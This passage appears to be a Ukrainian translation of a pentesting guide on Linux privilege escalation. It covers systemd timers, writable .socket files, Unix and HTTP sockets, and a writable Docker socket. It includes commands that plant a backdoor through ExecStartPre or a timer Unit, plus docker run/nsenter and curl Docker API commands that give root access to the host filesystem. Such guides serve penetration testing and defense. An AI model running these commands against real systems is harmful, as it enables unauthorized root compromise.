**–¢–∞–π–º–µ—Ä–∏** - —Ü–µ —Ñ–∞–π–ª—ã –æ–¥–∏–Ω–∏—Ü—å systemd, —ñ–º'—è —è–∫–∏—Ö –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ `**.timer**`, —è–∫—ñ –∫–µ—Ä—É—é—Ç—å —Ñ–∞–π–ª–∞–º–∏ –∞–±–æ –ø–æ–¥—ñ—è–º–∏ `**.service**`. **–¢–∞–π–º–µ—Ä–∏** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ —è–∫ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ cron, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –º–∞—é—Ç—å –≤–±—É–¥–æ–≤–∞–Ω—É –ø—ñ–¥—Ç—Ä–∏–º–∫—É –ø–æ–¥—ñ–π –∫–∞–ª–µ–Ω–¥–∞—Ä–Ω–æ–≥–æ —á–∞—Å—É —Ç–∞ –º–æ–Ω–æ—Ç–æ–Ω–Ω–∏—Ö –ø–æ–¥—ñ–π —Ç–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞–ø—É—â–µ–Ω—ñ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –≤—Å—ñ —Ç–∞–π–º–µ—Ä–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
systemctl list-timers --all
```
### –ó–∞–ø–∏—Å—É–≤–∞–Ω—ñ —Ç–∞–π–º–µ—Ä–∏

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —Ç–∞–π–º–µ—Ä, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–µ—è–∫—ñ —ñ—Å–Ω—É—é—á—ñ –æ–¥–∏–Ω–∏—Ü—ñ systemd (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `.service` –∞–±–æ `.target`)
```bash
Unit=backdoor.service
```
–£ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏, —â–æ —Ç–∞–∫–µ Unit:

> Unit, —è–∫–∏–π –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è, –∫–æ–ª–∏ —Ç–∞–π–º–µ—Ä –∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è. –ê—Ä–≥—É–º–µ–Ω—Ç - —Ü–µ —ñ–º'—è unit, —Å—É—Ñ—ñ–∫—Å —è–∫–æ–≥–æ –Ω–µ —î ".timer". –Ø–∫—â–æ –Ω–µ –≤–∫–∞–∑–∞–Ω–æ, —Ü–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –Ω–∞ —Å–ª—É–∂–±—É, —è–∫–∞ –º–∞—î —Ç–µ —Å–∞–º–µ —ñ–º'—è, —â–æ –π unit —Ç–∞–π–º–µ—Ä–∞, –∑–∞ –≤–∏–Ω—è—Ç–∫–æ–º —Å—É—Ñ—ñ–∫—Å–∞. (–î–∏–≤. –≤–∏—â–µ.) –†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è, —â–æ–± —ñ–º'—è unit, —è–∫–∏–π –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è, —Ç–∞ —ñ–º'—è unit —Ç–∞–π–º–µ—Ä–∞ –±—É–ª–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω–∏–º–∏, –∑–∞ –≤–∏–Ω—è—Ç–∫–æ–º —Å—É—Ñ—ñ–∫—Å–∞.

–û—Ç–∂–µ, –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ:

* –ó–Ω–∞–π—Ç–∏ –¥–µ—è–∫–∏–π systemd unit (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `.service`), —è–∫–∏–π **–≤–∏–∫–æ–Ω—É—î –∑–∞–ø–∏—Å–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª**
* –ó–Ω–∞–π—Ç–∏ –¥–µ—è–∫–∏–π systemd unit, —è–∫–∏–π **–≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—ñ–¥–Ω–æ—Å–Ω–æ–≥–æ —à–ª—è—Ö—É**, —ñ —É –≤–∞—Å —î **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å** –¥–æ **—à–ª—è—Ö—É systemd** (—â–æ–± –≤–∏–¥–∞–ª—è—Ç–∏ —Ü–µ–π –≤–∏–∫–æ–Ω–∞–≤—á–∏–π —Ñ–∞–π–ª)

**–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ç–∞–π–º–µ—Ä–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `man systemd.timer`.**

### **–£–≤—ñ–º–∫–Ω–µ–Ω–Ω—è —Ç–∞–π–º–µ—Ä–∞**

–î–ª—è —É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è —Ç–∞–π–º–µ—Ä–∞ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ root —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer ‚Üí /lib/systemd/system/backu2.timer.
```
–ó–∞—É–≤–∞–∂—Ç–µ, —â–æ **—Ç–∞–π–º–µ—Ä** **–∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è**, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ —Å–∏–º–≤–æ–ª—ñ—á–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –Ω—å–æ–≥–æ —É `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## –°–æ–∫–µ—Ç–∏

–°–æ–∫–µ—Ç–∏ Unix Domain (UDS) –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é –ø—Ä–æ—Ü–µ—Å—ñ–≤** –Ω–∞ –æ–¥–Ω—ñ–π –∞–±–æ —Ä—ñ–∑–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö —É –º–æ–¥–µ–ª—è—Ö –∫–ª—ñ—î–Ω—Ç-—Å–µ—Ä–≤–µ—Ä. –í–æ–Ω–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ —Ñ–∞–π–ª–æ–≤—ñ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ Unix –¥–ª—è –º—ñ–∂–∫–æ–º–ø'—é—Ç–µ—Ä–Ω–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó —ñ –Ω–∞–ª–∞—à—Ç–æ–≤—É—é—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ñ–∞–π–ª–∏ `.socket`.

–°–æ–∫–µ—Ç–∏ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ–∞–π–ª—ñ–≤ `.socket`.

**–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Å–æ–∫–µ—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `man systemd.socket`.** –£ —Ü—å–æ–º—É —Ñ–∞–π–ª—ñ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ —Ü—ñ–∫–∞–≤–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: –¶—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ —Ä—ñ–∑–Ω—è—Ç—å—Å—è, –∞–ª–µ —É–∑–∞–≥–∞–ª—å–Ω–µ–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–≤–∫–∞–∑—ñ–≤–∫–∏, –¥–µ –±—É–¥–µ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—Ç–∏—Å—è** —Å–æ–∫–µ—Ç (—à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É —Å–æ–∫–µ—Ç–∞ AF\_UNIX, IPv4/6 —Ç–∞/–∞–±–æ –Ω–æ–º–µ—Ä –ø–æ—Ä—Ç—É –¥–ª—è –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è —ñ —Ç. –¥.)
* `Accept`: –ü—Ä–∏–π–º–∞—î –±—É–ª–µ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è. –Ø–∫—â–æ **true**, –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –≤—Ö—ñ–¥–Ω–æ–≥–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è **–µ–∫–∑–µ–º–ø–ª—è—Ä —Å–ª—É–∂–±–∏**, —ñ –ª–∏—à–µ —Å–æ–∫–µ—Ç –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –π–æ–º—É. –Ø–∫—â–æ **false**, –≤—Å—ñ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—é—á—ñ —Å–æ–∫–µ—Ç–∏ —Å–∞–º—ñ **–ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è –∑–∞–ø—É—â–µ–Ω—ñ–π —Å–ª—É–∂–±—ñ**, —ñ –ª–∏—à–µ –æ–¥–∏–Ω –µ–∫–∑–µ–º–ø–ª—è—Ä —Å–ª—É–∂–±–∏ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –¥–ª—è –≤—Å—ñ—Ö –ø—ñ–¥–∫–ª—é—á–µ–Ω—å. –¶–µ –∑–Ω–∞—á–µ–Ω–Ω—è —ñ–≥–Ω–æ—Ä—É—î—Ç—å—Å—è –¥–ª—è –¥–∞—Ç–∞–≥—Ä–∞–º–Ω–∏—Ö —Å–æ–∫–µ—Ç—ñ–≤ —Ç–∞ FIFO, –¥–µ –æ–¥–∏–Ω —Å–ª—É–∂–±–æ–≤–∏–π –±–ª–æ–∫ –æ–¥–Ω–æ–∑–Ω–∞—á–Ω–æ –æ–±—Ä–æ–±–ª—è—î –≤–µ—Å—å –≤—Ö—ñ–¥–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫. **–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º false**. –ó –º—ñ—Ä–∫—É–≤–∞–Ω—å –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –ø–∏—Å–∞—Ç–∏ –Ω–æ–≤—ñ –¥–µ–º–æ–Ω–∏ —Ç—ñ–ª—å–∫–∏ —Ç–∞–∫, —â–æ–± –≤–æ–Ω–∏ –ø—ñ–¥—Ö–æ–¥–∏–ª–∏ –¥–ª—è `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: –ü—Ä–∏–π–º–∞—î –æ–¥–∏–Ω –∞–±–æ –∫—ñ–ª—å–∫–∞ —Ä—è–¥–∫—ñ–≤ –∫–æ–º–∞–Ω–¥, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è **–ø–µ—Ä–µ–¥ —Ç–∏–º, —è–∫** –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—é—á—ñ **—Å–æ–∫–µ—Ç–∏**/FIFO **—Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è** —Ç–∞ –∑–≤'—è–∑—É—é—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ. –ü–µ—Ä—à–∏–π —Ç–æ–∫–µ–Ω —Ä—è–¥–∫–∞ –∫–æ–º–∞–Ω–¥–∏ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∞–±—Å–æ–ª—é—Ç–Ω–∏–º —ñ–º–µ–Ω–µ–º —Ñ–∞–π–ª—É, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—é—Ç—å –∞—Ä–≥—É–º–µ–Ω—Ç–∏ –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É.
* `ExecStopPre`, `ExecStopPost`: –î–æ–¥–∞—Ç–∫–æ–≤—ñ **–∫–æ–º–∞–Ω–¥–∏**, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è **–ø–µ—Ä–µ–¥ —Ç–∏–º, —è–∫** –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—é—á—ñ **—Å–æ–∫–µ—Ç–∏**/FIFO **–∑–∞–∫—Ä–∏–≤–∞—é—Ç—å—Å—è** —Ç–∞ –≤–∏–¥–∞–ª—è—é—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.
* `Service`: –í–∫–∞–∑—É—î —ñ–º'—è **—Å–ª—É–∂–±–∏**, —è–∫—É **–∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏** –ø—Ä–∏ **–≤—Ö—ñ–¥–Ω–æ–º—É —Ç—Ä–∞—Ñ—ñ–∫—É**. –¶–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª–µ–Ω–æ –ª–∏—à–µ –¥–ª—è —Å–æ–∫–µ—Ç—ñ–≤ –∑ Accept=no. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–æ–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –Ω–∞ —Å–ª—É–∂–±—É, —è–∫–∞ –º–∞—î —Ç–µ —Å–∞–º–µ —ñ–º'—è, —â–æ –π —Å–æ–∫–µ—Ç (–∑–∞–º—ñ–Ω–µ–Ω–æ —Å—É—Ñ—ñ–∫—Å–æ–º). –£ –±—ñ–ª—å—à–æ—Å—Ç—ñ –≤–∏–ø–∞–¥–∫—ñ–≤ –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –ø–∞—Ä–∞–º–µ—Ç—Ä.

### –ó–∞–ø–∏—Å—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏ .socket

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **–∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–π** —Ñ–∞–π–ª `.socket`, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏** –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ä–æ–∑–¥—ñ–ª—É `[Socket]` —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫: `ExecStartPre=/home/kali/sys/backdoor`, —ñ backdoor –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –ø–µ—Ä–µ–¥ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è–º —Å–æ–∫–µ—Ç–∞. –¢–æ–º—É, –π–º–æ–≤—ñ—Ä–Ω–æ, –≤–∞–º **–¥–æ–≤–µ–¥–µ—Ç—å—Å—è –∑–∞—á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ –º–∞—à–∏–Ω–∞ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è.**\
_–ó–∞—É–≤–∞–∂—Ç–µ, —â–æ —Å–∏—Å—Ç–µ–º–∞ –ø–æ–≤–∏–Ω–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ñ–∞–π–ª—É —Å–æ–∫–µ—Ç–∞, —ñ–Ω–∞–∫—à–µ backdoor –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ_

### –ó–∞–ø–∏—Å—É–≤–∞–Ω—ñ —Å–æ–∫–µ—Ç–∏

–Ø–∫—â–æ –≤–∏ **–≤–∏–∑–Ω–∞—á–∏—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–π —Å–æ–∫–µ—Ç** (_–∑–∞—Ä–∞–∑ –º–∏ –≥–æ–≤–æ—Ä–∏–º–æ –ø—Ä–æ Unix —Å–æ–∫–µ—Ç–∏, –∞ –Ω–µ –ø—Ä–æ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó `.socket`_), —Ç–æ **–≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è** –∑ —Ü–∏–º —Å–æ–∫–µ—Ç–æ–º —ñ, –º–æ–∂–ª–∏–≤–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.

### –ü–µ—Ä–µ–ª—ñ–∫ Unix —Å–æ–∫–µ—Ç—ñ–≤
```bash
netstat -a -p --unix
```
### –°–∏—Ä–æ–≤–∏–Ω–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**–ü—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP —Å–æ–∫–µ—Ç–∏

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–æ–∂—É—Ç—å —ñ—Å–Ω—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ **—Å–æ–∫–µ—Ç–∏, —è–∫—ñ —Å–ª—É—Ö–∞—é—Ç—å HTTP** –∑–∞–ø–∏—Ç–∏ (_–Ø –Ω–µ –≥–æ–≤–æ—Ä—é –ø—Ä–æ —Ñ–∞–π–ª–∏ .socket, –∞ –ø—Ä–æ —Ñ–∞–π–ª–∏, —è–∫—ñ –¥—ñ—é—Ç—å —è–∫ unix —Å–æ–∫–µ—Ç–∏_). –í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
–Ø–∫—â–æ **—Å–æ–∫–µ—Ç –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–∞ –∑–∞–ø–∏—Ç HTTP**, —Ç–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏** –∑ –Ω–∏–º —ñ, –º–æ–∂–ª–∏–≤–æ, **–µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ**.

### –ó–∞–ø–∏—Å–Ω–∏–π Docker Socket

–°–æ–∫–µ—Ç Docker, —è–∫–∏–π —á–∞—Å—Ç–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ —à–ª—è—Ö–æ–º `/var/run/docker.sock`, —î –∫—Ä–∏—Ç–∏—á–Ω–∏–º —Ñ–∞–π–ª–æ–º, —è–∫–∏–π –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∑–∞—Ö–∏—â–µ–Ω–∏–π. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—ñ–Ω –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º `root` —Ç–∞ —á–ª–µ–Ω–∞–º–∏ –≥—Ä—É–ø–∏ `docker`. –í–æ–ª–æ–¥—ñ–Ω–Ω—è –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Ü—å–æ–≥–æ —Å–æ–∫–µ—Ç—É –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤. –û—Å—å —Ä–æ–∑–±—ñ—Ä —Ç–æ–≥–æ, —è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, —Ç–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ñ –º–µ—Ç–æ–¥–∏, —è–∫—â–æ CLI Docker –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π.

#### **–ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Docker CLI**

–Ø–∫—â–æ —É –≤–∞—Å —î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Å–æ–∫–µ—Ç—É Docker, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –∫–æ–º–∞–Ω–¥:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
### **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Docker API –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ**

–£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ Docker CLI –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π, —Å–æ–∫–µ—Ç Docker –≤—Å–µ —â–µ –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Docker API —Ç–∞ –∫–æ–º–∞–Ω–¥ `curl`.

1. **–ü–µ—Ä–µ–ª—ñ–∫ –æ–±—Ä–∞–∑—ñ–≤ Docker:** –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –æ–±—Ä–∞–∑—ñ–≤.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:** –ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, —è–∫–∏–π –º–æ–Ω—Ç—É—î –∫–æ—Ä–µ–Ω–µ–≤–∏–π –∫–∞—Ç–∞–ª–æ–≥ —Å–∏—Å—Ç–µ–º–∏ —Ö–æ—Å—Ç–∞.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

–ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **–ü—Ä–∏—î–¥–Ω–∞–Ω–Ω—è –¥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:** –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `socat`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–º, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

–ü—ñ—Å–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω–Ω—è `socat` –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ –∑ —Ä—ñ–≤–Ω–µ–º –¥–æ—Å—Ç—É–ø—É root –¥–æ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ö–æ—Å—Ç–∞.

### –Ü–Ω—à—ñ

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ —É –≤–∞—Å —î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Å–æ–∫–µ—Ç—É Docker —á–µ—Ä–µ–∑ **–Ω–∞–ª–µ–∂–Ω—ñ—Å—Ç—å –¥–æ –≥—Ä—É–ø–∏ `docker`**, —É –≤–∞—Å —î [**–±—ñ–ª—å—à–µ —Å–ø–æ—Å–æ–±—ñ–≤ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**](interesting-groups-linux-pe/#docker-group). –Ø–∫—â–æ [**API Docker –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—î –ø–æ—Ä—Ç** –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **—ñ–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –≤–∏—Ö–æ–¥—É –∑ Docker –∞–±–æ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –Ω–∏–º –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** –≤:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ Containerd (ctr)

